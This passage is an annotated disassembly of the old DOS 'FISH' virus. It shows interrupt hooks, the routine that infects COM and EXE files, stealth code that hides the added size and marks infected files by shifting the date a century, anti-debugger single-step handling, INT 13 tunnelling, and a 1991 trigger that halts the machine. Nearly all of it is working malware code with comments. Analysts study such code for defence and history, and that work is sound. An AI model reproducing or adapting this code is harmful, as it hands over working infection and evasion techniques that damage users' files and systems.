3411:0777 E880FA         CALL   01FA            ; CARP2 - set interrupt
3411:077A 1F             POP    DS 
3411:077B 9D             POPF    
3411:077C 58             POP    AX 
3411:077D 2E8B26FF0E     MOV    SP,CS:[0EFF] 
3411:0782 2E8E16010F     MOV    SS,CS:[0F01] 
3411:0787 2EFF2E030F     JMP    FAR CS:[0F03]

;------------------------------------------------------------------------
                        DB      'SOLE'

3411:0790 8B5C01         MOV    BX,[SI+01] 
3411:0793 8B8039F2       MOV    AX,[BX+SI+F239] 
3411:0797 8904           MOV    [SI],AX 
3411:0799 8B803BF2       MOV    AX,[BX+SI+F23B] 
3411:079D 894402         MOV    [SI+02],AX 
3411:07A0 8B803DF2       MOV    AX,[BX+SI+F23D] 
3411:07A4 894404         MOV    [SI+04],AX 
3411:07A7 E8D703         CALL   0B81            ; Print msg & halt if 1991
3411:07AA EB9B           JMP    0747 

;  INT 21, FUNCTION 4B01, Load but do not execute.

3411:07AC 3C01           CMP    AL,01           ; We only know 4B01
3411:07AE 7403           JZ 07B3 
3411:07B0 E99BFC         JMP    044E 

3411:07B3 2E830EB30E01   OR Word Ptr CS:[0EB3],+01 
3411:07B9 2E8C06260E     MOV    CS:[0E26],ES    ; save param block segment
3411:07BE 2E891E240E     MOV    CS:[0E24],BX    ; save param block offset
3411:07C3 E8A9F9         CALL   016F            ; COD2 - restore registers
3411:07C6 E888F9         CALL   0151            ; Call DOS to load
3411:07C9 E890F9         CALL   015C            ; COD1 - save registers
3411:07CC 2EC41E240E     LES    BX,CS:[0E24]    ; restore param block
3411:07D1 26C57712       LDS    SI,ES:[BX+12] 
3411:07D5 7274           JB 084B 
3411:07D7 2E8026B30EFE   AND    Byte Ptr CS:[0EB3],FE 
3411:07DD 83FE01         CMP    SI,+01 
3411:07E0 7429           JZ 080B 
3411:07E2 8B04           MOV    AX,[SI] 
3411:07E4 034402         ADD    AX,[SI+02] 
3411:07E7 53             PUSH   BX 
3411:07E8 8B5C04         MOV    BX,[SI+04] 
3411:07EB F7D3           NOT    BX 
3411:07ED 01D8           ADD    AX,BX 
3411:07EF 5B             POP    BX 
3411:07F0 7545           JNZ    0837 
3411:07F2 8B5C01         MOV    BX,[SI+01] 
3411:07F5 8B8039F2       MOV    AX,[BX+SI+F239] 
3411:07F9 8904           MOV    [SI],AX 
3411:07FB 8B803BF2       MOV    AX,[BX+SI+F23B] 
3411:07FF 894402         MOV    [SI+02],AX 
3411:0802 8B803DF2       MOV    AX,[BX+SI+F23D] 
3411:0806 894404         MOV    [SI+04],AX 
3411:0809 EB2C           JMP    0837
 
3411:080B 8B161A00       MOV    DX,[001A] 
3411:080F E83202         CALL   0A44            ; MACKEREL2
3411:0812 2E8B0EA30E     MOV    CX,CS:[0EA3] 
3411:0817 83C110         ADD    CX,+10 
3411:081A 01CA           ADD    DX,CX 
3411:081C 26895714       MOV    ES:[BX+14],DX 
3411:0820 A11800         MOV    AX,[0018] 
3411:0823 26894712       MOV    ES:[BX+12],AX 
3411:0827 A11200         MOV    AX,[0012] 
3411:082A 03C1           ADD    AX,CX 
3411:082C 26894710       MOV    ES:[BX+10],AX 
3411:0830 A11400         MOV    AX,[0014] 
3411:0833 2689470E       MOV    ES:[BX+0E],AX 
3411:0837 E80A02         CALL   0A44            ; MACKEREL2
3411:083A 2E8E1EA30E     MOV    DS,CS:[0EA3] 
3411:083F 8B4602         MOV    AX,[BP+02] 
3411:0842 A30A00         MOV    [000A],AX 
3411:0845 8B4604         MOV    AX,[BP+04] 
3411:0848 A30C00         MOV    [000C],AX 
3411:084B E963FC         JMP    04B1

;------------------------------------------------------------------------
                         DB      'FISH'

3411:0852 E8AB04         CALL   0D00 
3411:0855 E8DC00         CALL   0934

;  EXE or COM program?

3411:0858 C606200001     MOV    Byte Ptr [0020],01      ; COM/EXE flag
3411:085D 813E000E4D5A   CMP    Word Ptr [0E00],'ZM'
3411:0863 740E           JZ 0873 
3411:0865 813E000E5A4D   CMP    Word Ptr [0E00],'MZ'
3411:086B 7406           JZ     0873
3411:086D FE0E2000       DEC    Byte Ptr [0020] 
3411:0871 7458           JZ     08CB

3411:0873 A1040E         MOV    AX,[0E04] 
3411:0876 D1E1           SHL    CX,1 
3411:0878 F7E1           MUL    CX 
3411:087A 050002         ADD    AX,0200 
3411:087D 39F0           CMP    AX,SI 
3411:087F 7248           JB     08C9
 
3411:0881 A10A0E         MOV    AX,[0E0A] 
3411:0884 0B060C0E       OR AX,[0E0C] 
3411:0888 743F           JZ 08C9 
3411:088A 8B16AB0E       MOV    DX,[0EAB] 
3411:088E B90002         MOV    CX,0200 
3411:0891 A1A90E         MOV    AX,[0EA9] 
3411:0894 F7F1           DIV    CX 
3411:0896 0BD2           OR DX,DX 
3411:0898 7401           JZ 089B 
3411:089A 40             INC    AX 
3411:089B 8916020E       MOV    [0E02],DX 
3411:089F A3040E         MOV    [0E04],AX 
3411:08A2 833E140E01     CMP    Word Ptr [0E14],+01 
3411:08A7 746D           JZ 0916 
3411:08A9 C706140E0100   MOV    Word Ptr [0E14],0001 
3411:08AF 8BC6           MOV    AX,SI 
3411:08B1 2B06080E       SUB    AX,[0E08] 
3411:08B5 A3160E         MOV    [0E16],AX 
3411:08B8 8306040E07     ADD    Word Ptr [0E04],+07 
3411:08BD C706100E000E   MOV    Word Ptr [0E10],0E00 
3411:08C3 A30E0E         MOV    [0E0E],AX 
3411:08C6 E8CD00         CALL   0996            ; PIKE1
3411:08C9 EB4B           JMP    0916 
3411:08CB 81FE000F       CMP    SI,0F00 
3411:08CF 7345           JNB    0916 
3411:08D1 A1000E         MOV    AX,[0E00] 
3411:08D4 A30400         MOV    [0004],AX 
3411:08D7 01C2           ADD    DX,AX 
3411:08D9 A1020E         MOV    AX,[0E02] 
3411:08DC A30600         MOV    [0006],AX 
3411:08DF 01C2           ADD    DX,AX 
3411:08E1 A1040E         MOV    AX,[0E04] 
3411:08E4 A30800         MOV    [0008],AX 
3411:08E7 F7D0           NOT    AX 
3411:08E9 01C2           ADD    DX,AX 
3411:08EB 7429           JZ 0916 
3411:08ED A1F20E         MOV    AX,[0EF2] 
3411:08F0 2404           AND    AL,04 
3411:08F2 7522           JNZ    0916 

;  Place JMP at beginning of newly infected file.

3411:08F4 B1E9           MOV    CL,E9           ; JMP instruction
3411:08F6 B81000         MOV    AX,0010 
3411:08F9 880E000E       MOV    [0E00],CL 
3411:08FD F7E6           MUL    SI 
3411:08FF 05CB0D         ADD    AX,0DCB 
3411:0902 A3010E         MOV    [0E01],AX       ; JMP target
3411:0905 A1000E         MOV    AX,[0E00] 
3411:0908 0306020E       ADD    AX,[0E02] 
3411:090C F7D8           NEG    AX              ; Signature of some sort
3411:090E F7D0           NOT    AX 
3411:0910 A3040E         MOV    [0E04],AX 
3411:0913 E88000         CALL   0996            ; PIKE1
3411:0916 B43E           MOV    AH,3E           ; Close file
3411:0918 E836F8         CALL   0151 
3411:091B 2E8B0EF20E     MOV    CX,CS:[0EF2] 
3411:0920 B80143         MOV    AX,4301         ; Set file attributes
3411:0923 2E8B16F40E     MOV    DX,CS:[0EF4] 
3411:0928 2E8E1EF60E     MOV    DS,CS:[0EF6] 
3411:092D E821F8         CALL   0151 
3411:0930 E84D04         CALL   0D80 
3411:0933 C3             RET
 
3411:0934 0E             PUSH   CS 
3411:0935 B80057         MOV    AX,5700 
3411:0938 1F             POP    DS 
3411:0939 E815F8         CALL   0151            ; Get file date+time
3411:093C 890E290E       MOV    [0E29],CX       ; File time stash
3411:0940 B80042         MOV    AX,4200         ; Move file pointer
3411:0943 89162B0E       MOV    [0E2B],DX       ; File date stash
3411:0947 33C9           XOR    CX,CX 
3411:0949 33D2           XOR    DX,DX 
3411:094B E803F8         CALL   0151 
3411:094E B43F           MOV    AH,3F           ; Read bytes
3411:0950 BA000E         MOV    DX,0E00 
3411:0953 B11C           MOV    CL,1C           ; ExeHeader size?
3411:0955 E8F9F7         CALL   0151 
3411:0958 33C9           XOR    CX,CX 
3411:095A B80042         MOV    AX,4200         ; Move file pointer
3411:095D 33D2           XOR    DX,DX 
3411:095F E8EFF7         CALL   0151 
3411:0962 B11C           MOV    CL,1C           ; ExeHeader size?
3411:0964 B43F           MOV    AH,3F           ; Read bytes
3411:0966 BA0400         MOV    DX,0004 
3411:0969 E8E5F7         CALL   0151 
3411:096C 33C9           XOR    CX,CX 
3411:096E B80242         MOV    AX,4202         ; Move file pointer from end
3411:0971 8BD1           MOV    DX,CX 
3411:0973 E8DBF7         CALL   0151 
3411:0976 8916AB0E       MOV    [0EAB],DX 
3411:097A A3A90E         MOV    [0EA9],AX 
3411:097D 8BF8           MOV    DI,AX 
3411:097F 050F00         ADD    AX,000F 
3411:0982 83D200         ADC    DX,+00 
3411:0985 25F0FF         AND    AX,FFF0 
3411:0988 29C7           SUB    DI,AX 
3411:098A B91000         MOV    CX,0010 
3411:098D F7F1           DIV    CX 
3411:098F 8BF0           MOV    SI,AX 
3411:0991 C3             RET

;------------------------------------------------------------------------
                        DB      'PIKE'
;  PIKE1

3411:0996 33C9           XOR    CX,CX 
3411:0998 B80042         MOV    AX,4200         ; Move file pointer
3411:099B 8BD1           MOV    DX,CX 
3411:099D E8B1F7         CALL   0151 
3411:09A0 B11C           MOV    CL,1C 
3411:09A2 B440           MOV    AH,40           ; Write to file
3411:09A4 BA000E         MOV    DX,0E00 
3411:09A7 E8A7F7         CALL   0151 
3411:09AA B81000         MOV    AX,0010 
3411:09AD F7E6           MUL    SI 
3411:09AF 8BCA           MOV    CX,DX 
3411:09B1 8BD0           MOV    DX,AX 
3411:09B3 B80042         MOV    AX,4200         ; Move file pointer
3411:09B6 E898F7         CALL   0151 
3411:09B9 B9000E         MOV    CX,0E00 
3411:09BC 33D2           XOR    DX,DX 
3411:09BE 01F9           ADD    CX,DI 
3411:09C0 B440           MOV    AH,40
3411:09C2 2EC606330E01   MOV    Byte Ptr CS:[0E33],01 
3411:09C8 53             PUSH   BX 
3411:09C9 E8DD04         CALL   0EA9 
3411:09CC 5B             POP    BX 
3411:09CD 8B0E290E       MOV    CX,[0E29]       ; File time
3411:09D1 B80157         MOV    AX,5701         ; Set file date+time
3411:09D4 8B162B0E       MOV    DX,[0E2B]       ; File date stash
3411:09D8 F6C680         TEST   DH,80 
3411:09DB 7503           JNZ    09E0 
3411:09DD 80C6C8         ADD    DH,C8           ; 100 years?
3411:09E0 E86EF7         CALL   0151 
3411:09E3 C3             RET     

;  PIKE2

3411:09E4 E8C5F7         CALL   01AC            ; SHARK2 - save regs internal
3411:09E7 89D7           MOV    DI,DX 
3411:09E9 83C70D         ADD    DI,+0D 
3411:09EC 1E             PUSH   DS 
3411:09ED 07             POP    ES 
3411:09EE EB20           JMP    0A10
 
;  PIKE3  -- process filename

;  Get the drive from the filename. Then check to see if this
;  is a COM or EXE file. Returns carry clear if it is.

3411:09F0 E8B9F7         CALL   01AC            ; SHARK2 - save regs internal
3411:09F3 1E             PUSH   DS 
3411:09F4 07             POP    ES 
3411:09F5 B95000         MOV    CX,0050 
3411:09F8 89D7           MOV    DI,DX           ; Filename now @ ES:DI
3411:09FA B300           MOV    BL,00           ; Assume current drive
3411:09FC 33C0           XOR    AX,AX 

;  If drive specification is included, snag it

3411:09FE 807D013A       CMP    Byte Ptr [DI+01],':'
3411:0A02 7505           JNZ    0A09 
3411:0A04 8A1D           MOV    BL,[DI]         ; Get letter
3411:0A06 80E31F         AND    BL,1F           ; Convert to 0..FF
3411:0A09 2E881E280E     MOV    CS:[0E28],BL    ; drive code

;  Search for end of filename, AL contains a zero

3411:0A0E F2             REPNZ  
3411:0A0F AE             SCASB
   
;  Determine with the file extension (last 3 characters of filename).
;  This is done by converting to uppercase and adding them together.

3411:0A10 8B45FD         MOV    AX,[DI-03]      ; Last 2 chars of ext
3411:0A13 25DFDF         AND    AX,DFDF         ; uppercase
3411:0A16 02E0           ADD    AH,AL 
3411:0A18 8A45FC         MOV    AL,[DI-04]      ; First char of ext
3411:0A1B 24DF           AND    AL,DF           ; uppercase
3411:0A1D 02C4           ADD    AL,AH 
3411:0A1F 2EC606200000   MOV    Byte Ptr CS:[0020],00 
3411:0A25 3CDF           CMP    AL,'C'+'O'+'M'  ; COM file
3411:0A27 7409           JZ 0A32 
3411:0A29 2EFE062000     INC    Byte Ptr CS:[0020] 
3411:0A2E 3CE2           CMP    AL,'E'+'X'+'E'  ; EXE file
3411:0A30 750D           JNZ    0A3F            ; MACKEREL1

;  This is an executable, clear carry.

3411:0A32 E852F7         CALL   0187            ; SHARK1 - rest regs internal
3411:0A35 F8             CLC     
3411:0A36 C3             RET

;------------------------------------------------------------------------
                        DB      'MACKEREL'

;  (Continued from PIKE3 above) Not an executable, set carry.

3411:0A3F E845F7         CALL   0187            ; SHARK1 - rest regs internal
3411:0A42 F9             STC     
3411:0A43 C3             RET
     
;  MACKEREL2

3411:0A44 53             PUSH   BX
3411:0A45 B451           MOV    AH,51           ; Get PSP segment
3411:0A47 E807F7         CALL   0151 
3411:0A4A 2E891EA30E     MOV    CS:[0EA3],BX 
3411:0A4F 5B             POP    BX 
3411:0A50 C3             RET
     
;  MACKEREL3

3411:0A51 E8AC02         CALL   0D00 
3411:0A54 52             PUSH   DX 
3411:0A55 B436           MOV    AH,36           ; Get free disk space
3411:0A57 2E8A16280E     MOV    DL,CS:[0E28]    ; Drive code
3411:0A5C E8F2F6         CALL   0151 
3411:0A5F F7E1           MUL    CX 
3411:0A61 F7E3           MUL    BX 
3411:0A63 89D3           MOV    BX,DX 
3411:0A65 5A             POP    DX 
3411:0A66 0BDB           OR BX,BX 
3411:0A68 7505           JNZ    0A6F 
3411:0A6A 3D0040         CMP    AX,4000 
3411:0A6D 7248           JB 0AB7 
3411:0A6F B80043         MOV    AX,4300         ; Get file attrs
3411:0A72 E8DCF6         CALL   0151 
3411:0A75 7240           JB 0AB7 
3411:0A77 2E8916F40E     MOV    CS:[0EF4],DX 
3411:0A7C 2E890EF20E     MOV    CS:[0EF2],CX 
3411:0A81 2E8C1EF60E     MOV    CS:[0EF6],DS 
3411:0A86 B80143         MOV    AX,4301         ; Set file attrs
3411:0A89 33C9           XOR    CX,CX           ; to nothing
3411:0A8B E8C3F6         CALL   0151 
3411:0A8E 2E803EDA0E00   CMP    Byte Ptr CS:[0EDA],00 
3411:0A94 7521           JNZ    0AB7

;  Open file, read/write access

3411:0A96 B8023D         MOV    AX,3D02 
3411:0A99 E8B5F6         CALL   0151 
3411:0A9C 7219           JB     0AB7
 
3411:0A9E 8BD8           MOV    BX,AX 
3411:0AA0 53             PUSH   BX 
3411:0AA1 B432           MOV    AH,32           ; Get drive param blk
3411:0AA3 2E8A16280E     MOV    DL,CS:[0E28]    ; Drive code
3411:0AA8 E8A6F6         CALL   0151 
3411:0AAB 8B471E         MOV    AX,[BX+1E] 
3411:0AAE 2EA3EC0E       MOV    CS:[0EEC],AX 
3411:0AB2 5B             POP    BX 
3411:0AB3 E8CA02         CALL   0D80 
3411:0AB6 C3             RET     
3411:0AB7 33DB           XOR    BX,BX 
3411:0AB9 4B             DEC    BX 
3411:0ABA E8C302         CALL   0D80 
3411:0ABD C3             RET
     
;  If this is a character file, get its time to
;  determine if it has been infected.

3411:0ABE 51             PUSH   CX 
3411:0ABF 52             PUSH   DX 
3411:0AC0 50             PUSH   AX 
3411:0AC1 B80044         MOV    AX,4400         ; IOCTL get device info
3411:0AC4 E88AF6         CALL   0151 
3411:0AC7 80F280         XOR    DL,80 
3411:0ACA F6C280         TEST   DL,80 
3411:0ACD 7409           JZ 0AD8 
3411:0ACF B80057         MOV    AX,5700         ; Get file time+date
3411:0AD2 E87CF6         CALL   0151 
3411:0AD5 F6C680         TEST   DH,80 
3411:0AD8 58             POP    AX 
3411:0AD9 5A             POP    DX 
3411:0ADA 59             POP    CX 
3411:0ADB C3             RET
     
3411:0ADC E8CDF6         CALL   01AC            ; SHARK2 - save regs internal
3411:0ADF 33C9           XOR    CX,CX 
3411:0AE1 B80142         MOV    AX,4201         ; Move file pointer
3411:0AE4 33D2           XOR    DX,DX 
3411:0AE6 E868F6         CALL   0151 
3411:0AE9 2E8916A70E     MOV    CS:[0EA7],DX 
3411:0AEE 2EA3A50E       MOV    CS:[0EA5],AX 
3411:0AF2 B80242         MOV    AX,4202         ; Move file pointer
3411:0AF5 33C9           XOR    CX,CX 
3411:0AF7 33D2           XOR    DX,DX 
3411:0AF9 E855F6         CALL   0151 
3411:0AFC 2E8916AB0E     MOV    CS:[0EAB],DX 
3411:0B01 2EA3A90E       MOV    CS:[0EA9],AX 
3411:0B05 B80042         MOV    AX,4200         ; Move file pointer
3411:0B08 2E8B16A50E     MOV    DX,CS:[0EA5] 
3411:0B0D 2E8B0EA70E     MOV    CX,CS:[0EA7] 
3411:0B12 E83CF6         CALL   0151 
3411:0B15 E86FF6         CALL   0187            ; SHARK1 - rest regs internal
3411:0B18 C3             RET

;------------------------------------------------------------------------
                        DB      'FISH'

;  I N T 2 1 / AH = 57 -- Get / Set file time+date

3411:0B1D 0AC0           OR AL,AL 
3411:0B1F 7522           JNZ    0B43 
3411:0B21 2E8326B30EFE   AND    Word Ptr CS:[0EB3],-02 
3411:0B27 E845F6         CALL   016F            ; COD2 - restore registers
3411:0B2A E824F6         CALL   0151 
3411:0B2D 720B           JB 0B3A 
3411:0B2F F6C680         TEST   DH,80 
3411:0B32 7403           JZ 0B37 
3411:0B34 80EEC8         SUB    DH,C8 
3411:0B37 E918F9         JMP    0452 
3411:0B3A 2E830EB30E01   OR Word Ptr CS:[0EB3],+01 
3411:0B40 E90FF9         JMP    0452 
3411:0B43 3C01           CMP    AL,01 
3411:0B45 7537           JNZ    0B7E 
3411:0B47 2E8326B30EFE   AND    Word Ptr CS:[0EB3],-02 
3411:0B4D F6C680         TEST   DH,80 
3411:0B50 7403           JZ 0B55 
3411:0B52 80EEC8         SUB    DH,C8 
3411:0B55 E866FF         CALL   0ABE            ; Infected?
3411:0B58 7403           JZ 0B5D 
3411:0B5A 80C6C8         ADD    DH,C8 

3411:0B5D E8F1F5         CALL   0151 
3411:0B60 8946FC         MOV    [BP-04],AX 
3411:0B63 2E8316B30E00   ADC    Word Ptr CS:[0EB3],+00 
3411:0B69 E945F9         JMP    04B1

;  I N T 2 1 / AH = 42 -- Move file pointer

3411:0B6C 3C02           CMP    AL,02           ; code 2 = From end of file
3411:0B6E 750E           JNZ    0B7E 

;  If moving relative to end of file, subtract our target

3411:0B70 E84BFF         CALL   0ABE            ; Infected?
3411:0B73 7409           JZ     0B7E 
3411:0B75 816EF6000E     SUB    Word Ptr [BP-0A],0E00 
3411:0B7A 835EF800       SBB    Word Ptr [BP-08],+00 
3411:0B7E E9CDF8         JMP    044E
 
;  If this is 1991, print "FISH VIRUS #6" string and halt

3411:0B81 E8D8F5         CALL   015C            ; COD1 - save registers
3411:0B84 B42A           MOV    AH,2A           ; Get system date
3411:0B86 E8C8F5         CALL   0151 
3411:0B89 81F9C707       CMP    CX,07C7         ; 1991
3411:0B8D 720B           JB 0B9A 
3411:0B8F B409           MOV    AH,09           ; Output string
3411:0B91 0E             PUSH   CS 
3411:0B92 1F             POP    DS 
3411:0B93 BAAB01         MOV    DX,01AB 
3411:0B96 E8B8F5         CALL   0151 
3411:0B99 F4             HLT     

3411:0B9A E8D2F5         CALL   016F            ; COD2 - restore registers
3411:0B9D C3             RET

;  I N T 2 1 / AH = 3F -- Read file or device

3411:0B9E 2E8026B30EFE   AND    Byte Ptr CS:[0EB3],FE 
3411:0BA4 E817FF         CALL   0ABE            ; Infected?
3411:0BA7 74D5           JZ 0B7E 
3411:0BA9 2E8916AD0E     MOV    CS:[0EAD],DX 
3411:0BAE 2E890EAF0E     MOV    CS:[0EAF],CX 
3411:0BB3 2EC706B10E0000 MOV    Word Ptr CS:[0EB1],0000 
3411:0BBA E81FFF         CALL   0ADC 
3411:0BBD 2EA1A90E       MOV    AX,CS:[0EA9] 
3411:0BC1 2E8B16AB0E     MOV    DX,CS:[0EAB] 
3411:0BC6 2D000E         SUB    AX,0E00 
3411:0BC9 83DA00         SBB    DX,+00 
3411:0BCC 2E2B06A50E     SUB    AX,CS:[0EA5] 
3411:0BD1 2E1B16A70E     SBB    DX,CS:[0EA7] 
3411:0BD6 7908           JNS    0BE0 
3411:0BD8 C746FC0000     MOV    Word Ptr [BP-04],0000 
3411:0BDD E92DFA         JMP    060D 
3411:0BE0 7508           JNZ    0BEA 
3411:0BE2 3BC1           CMP    AX,CX 
3411:0BE4 7704           JA 0BEA 
3411:0BE6 2EA3AF0E       MOV    CS:[0EAF],AX 
3411:0BEA 2E8B0EA70E     MOV    CX,CS:[0EA7] 
3411:0BEF 2E8B16A50E     MOV    DX,CS:[0EA5] 
3411:0BF4 0BC9           OR CX,CX 
3411:0BF6 7505           JNZ    0BFD 
3411:0BF8 83FA1C         CMP    DX,+1C 
3411:0BFB 761A           JBE    0C17 
3411:0BFD 2E8B16AD0E     MOV    DX,CS:[0EAD] 
3411:0C02 B43F           MOV    AH,3F           ; Read file
3411:0C04 2E8B0EAF0E     MOV    CX,CS:[0EAF] 
3411:0C09 E845F5         CALL   0151 
3411:0C0C 2E0306B10E     ADD    AX,CS:[0EB1] 
3411:0C11 8946FC         MOV    [BP-04],AX 
3411:0C14 E99AF8         JMP    04B1 
3411:0C17 89D7           MOV    DI,DX 
3411:0C19 89D6           MOV    SI,DX 
3411:0C1B 2E033EAF0E     ADD    DI,CS:[0EAF] 
3411:0C20 83FF1C         CMP    DI,+1C 
3411:0C23 7208           JB 0C2D 
3411:0C25 33FF           XOR    DI,DI 
3411:0C27 EB09           JMP    0C32

;------------------------------------------------------------------------
                        DB      'TUNA'

3411:0C2D 83EF1C         SUB    DI,+1C 
3411:0C30 F7DF           NEG    DI 
3411:0C32 8BC2           MOV    AX,DX 
3411:0C34 2E8B16A90E     MOV    DX,CS:[0EA9] 
3411:0C39 2E8B0EAB0E     MOV    CX,CS:[0EAB] 
3411:0C3E 83C20F         ADD    DX,+0F 
3411:0C41 83D100         ADC    CX,+00 
3411:0C44 83E2F0         AND    DX,-10 
3411:0C47 81EAFC0D       SUB    DX,0DFC 
3411:0C4B 83D900         SBB    CX,+00 
3411:0C4E 01C2           ADD    DX,AX 
3411:0C50 83D100         ADC    CX,+00 
3411:0C53 B80042         MOV    AX,4200         ; Move file pointer
3411:0C56 E8F8F4         CALL   0151 
3411:0C59 B91C00         MOV    CX,001C 
3411:0C5C 29F9           SUB    CX,DI 
3411:0C5E 29F1           SUB    CX,SI 
3411:0C60 B43F           MOV    AH,3F           ; Read file
3411:0C62 2E8B16AD0E     MOV    DX,CS:[0EAD] 
3411:0C67 E8E7F4         CALL   0151 
3411:0C6A 2E0106AD0E     ADD    CS:[0EAD],AX 
3411:0C6F 2E2906AF0E     SUB    CS:[0EAF],AX 
3411:0C74 2E0106B10E     ADD    CS:[0EB1],AX 
3411:0C79 33C9           XOR    CX,CX 
3411:0C7B B80042         MOV    AX,4200         ; Move file pointer
3411:0C7E BA1C00         MOV    DX,001C 
3411:0C81 E8CDF4         CALL   0151 
3411:0C84 E976FF         JMP    0BFD

;  TUNA2 -- SPOOF -- Skip over byte immediately after CALL

3411:0C87 2E2126310E     AND    CS:[0E31],SP
3411:0C8C E93801         JMP    0DC7            ; SPOOF

;  TUNA3
;  I N T 2 1 / AH = 4E,4F -- Search first/next match

3411:0C8F 2E8326B30EFE   AND    Word Ptr CS:[0EB3],-02 
3411:0C95 E8D7F4         CALL   016F            ; COD2 - restore registers
3411:0C98 E8B6F4         CALL   0151
3411:0C9B E8BEF4         CALL   015C            ; COD1 - save registers
3411:0C9E 7309           JNB    0CA9            ; a match was found
3411:0CA0 2E830EB30E01   OR Word Ptr CS:[0EB3],+01 
3411:0CA6 E908F8         JMP    04B1

;  A match was found. Subtract the virus length from
;  infected files and normalize the date.

3411:0CA9 E899F9         CALL   0645                    ; Get DTA address
3411:0CAC F6471980       TEST   Byte Ptr [BX+19],80     ; file date
3411:0CB0 7503           JNZ    0CB5                    ; infected..
3411:0CB2 E9FCF7         JMP    04B1 
3411:0CB5 816F1A000E     SUB    Word Ptr [BX+1A],0E00   ; file size
3411:0CBA 835F1C00       SBB    Word Ptr [BX+1C],+00    ; file size
3411:0CBE 806F19C8       SUB    Byte Ptr [BX+19],C8     ; normalize date
3411:0CC2 E9ECF7         JMP    04B1 
3411:0CC5 EB

;  A spoof routine

3411:0CC6 8E06450E       MOV    ES,[0E45]
3411:0CCA 06             PUSH   ES 
3411:0CCB 1F             POP    DS 
3411:0CCC FE0E0300       DEC    Byte Ptr [0003] 
3411:0CD0 8CDA           MOV    DX,DS 
3411:0CD2 4A             DEC    DX 
3411:0CD3 8EDA           MOV    DS,DX 
3411:0CD5 A10300         MOV    AX,[0003] 
3411:0CD8 FECC           DEC    AH 
3411:0CDA 01C2           ADD    DX,AX 
3411:0CDC A30300         MOV    [0003],AX 
3411:0CDF 5F             POP    DI 
3411:0CE0 42             INC    DX 
3411:0CE1 8EC2           MOV    ES,DX 
3411:0CE3 0E             PUSH   CS 
3411:0CE4 1F             POP    DS 
3411:0CE5 E8DF00         CALL   0DC7            ; SPOOF
3411:0CE8 A1
3411:0CE9 BEFE0F         MOV    SI,0FFE
3411:0CEC B90008         MOV    CX,0800
3411:0CEF 89F7           MOV    DI,SI 
3411:0CF1 FD             STD     
3411:0CF2 F3             REPZ   
3411:0CF3 A5             MOVSW   
3411:0CF4 FC             CLD     
3411:0CF5 06             PUSH   ES 
3411:0CF6 B8DD01         MOV    AX,01DD 
3411:0CF9 50             PUSH   AX 
3411:0CFA 2E8E06450E     MOV    ES,CS:[0E45] 
3411:0CFF CB             RETF
    
;  Single step through INT13

3411:0D00 2EC606DA0E00   MOV    Byte Ptr CS:[0EDA],00 
3411:0D06 E8A3F4         CALL   01AC            ; SHARK2 - save regs internal
3411:0D09 0E             PUSH   CS 
3411:0D0A E87AFF         CALL   0C87            ; TUNA2
3411:0D0D 88                                    ; filler
3411:0D0E B013           MOV    AL,13
3411:0D10 1F             POP    DS
3411:0D11 E8FCF4         CALL   0210            ; CARP3 - get interrupt
3411:0D14 8C062F0E       MOV    [0E2F],ES 
3411:0D18 891E2D0E       MOV    [0E2D],BX 
3411:0D1C 8C063B0E       MOV    [0E3B],ES 
3411:0D20 B202           MOV    DL,02 
3411:0D22 891E390E       MOV    [0E39],BX 
3411:0D26 8816500E       MOV    [0E50],DL 
3411:0D2A E8C2F4         CALL   01EF            ; CARP1 -- single step
3411:0D2D 8926DF0E       MOV    [0EDF],SP 
3411:0D31 8C16DD0E       MOV    [0EDD],SS 
3411:0D35 0E             PUSH   CS 
3411:0D36 B8290C         MOV    AX,0C29 
3411:0D39 50             PUSH   AX 
3411:0D3A B87000         MOV    AX,0070 
3411:0D3D B9FFFF         MOV    CX,FFFF 
3411:0D40 8EC0           MOV    ES,AX 
3411:0D42 33FF           XOR    DI,DI 
3411:0D44 B0CB           MOV    AL,CB 
3411:0D46 F2             REPNZ  
3411:0D47 AE             SCASB   
3411:0D48 4F             DEC    DI 
3411:0D49 9C             PUSHF   
3411:0D4A 06             PUSH   ES 
3411:0D4B 57             PUSH   DI 
3411:0D4C 9C             PUSHF   
3411:0D4D 58             POP    AX 
3411:0D4E 80CC01         OR AH,01 
3411:0D51 50             PUSH   AX 
3411:0D52 9D             POPF    
3411:0D53 33C0           XOR    AX,AX 
3411:0D55 FF2E2D0E       JMP    FAR [0E2D]
 
3411:0D59 0E             PUSH   CS 
3411:0D5A 1F             POP    DS 
3411:0D5B E86900         CALL   0DC7            ; SPOOF
3411:0D5E 8C
3411:0D5F B013BA         MOV    AL,13           ; BIOS int 13
3412:0D61 BA900D         MOV    DX,0D90
3411:0D64 E893F4         CALL   01FA
3411:0D67 B024           MOV    AL,24           ; Critical error INT24
3411:0D69 E8A4F4         CALL   0210            ; CARP3 - get interrupt
3411:0D6C 891E3D0E       MOV    [0E3D],BX 
3411:0D70 BAC50D         MOV    DX,0DC5 
3411:0D73 B024           MOV    AL,24           ; Critical error INT24
3411:0D75 8C063F0E       MOV    [0E3F],ES 
3411:0D79 E87EF4         CALL   01FA            ; CARP2 - set interrupt
3411:0D7C E808F4         CALL   0187            ; SHARK1 - rest regs internal
3411:0D7F C3             RET
     
3411:0D80 E829F4         CALL   01AC            ; SHARK2 - save regs internal
3411:0D83 2EC516390E     LDS    DX,CS:[0E39] 
3411:0D88 B013           MOV    AL,13           ; BIOS disk access
3411:0D8A E86DF4         CALL   01FA            ; CARP2 - set interrupt
3411:0D8D 2EC5163D0E     LDS    DX,CS:[0E3D] 
3411:0D92 B024           MOV    AL,24           ; Critical error INT24
3411:0D94 E863F4         CALL   01FA            ; CARP2 - set interrupt
3411:0D97 E8EDF3         CALL   0187            ; SHARK1 - rest regs internal
3411:0D9A C3             RET

;  I N T 0 1 H

;  Replacement SINGLE STEP interrupt, INT 01H.
;  This is the interrupt routine to prevent DEBUG from tracing.

;  During execution, the offset to here is 0CB7

3411:0D9B 55             PUSH   BP 
3411:0D9C 89E5           MOV    BP,SP 
3411:0D9E 816606FFFE     AND    Word Ptr [BP+06],FEFF 
3411:0DA3 FF461A         INC    Word Ptr [BP+1A] 
3411:0DA6 5D             POP    BP 
3411:0DA7 CF             IRET
    
3411:0DA8 2EC706500E0104 MOV    Word Ptr CS:[0E50],0401 
3411:0DAF E83DF4         CALL   01EF            ; CARP1 - Disable single step
3411:0DB2 E8BAF3         CALL   016F            ; COD2 - restore registers
3411:0DB5 50             PUSH   AX 
3411:0DB6 2EA1B30E       MOV    AX,CS:[0EB3] 
3411:0DBA 0D0001         OR AX,0100 
3411:0DBD 50             PUSH   AX 
3411:0DBE 9D             POPF    
3411:0DBF 58             POP    AX 
